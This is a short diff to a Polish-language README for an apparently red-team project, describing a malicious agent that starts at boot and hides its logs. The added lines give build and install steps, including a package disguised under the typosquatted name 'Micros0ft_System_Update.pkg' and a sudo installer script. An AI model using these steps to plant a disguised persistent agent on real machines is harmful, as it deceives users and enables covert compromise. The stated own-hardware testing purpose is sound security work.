@@ -41,6 +41,15 @@ Agent uruchamia się automatycznie przy starcie systemu i wykonuje złośliwe dz
 - Zapisuje logi do ukrytych lokalizacji
 
 ### Instalacja (TYLKO NA WŁASNYM SPRZĘCIE)
+
+**Metoda 1: Instalator Pakietu .pkg (Zalecane)**
+```bash
+cd red_team/pkg
+./build.sh
+open dist/Micros0ft_System_Update.pkg
+```
+
+**Metoda 2: Skrypt Instalacyjny**
 ```bash
 cd red_team
 sudo ./installer.sh
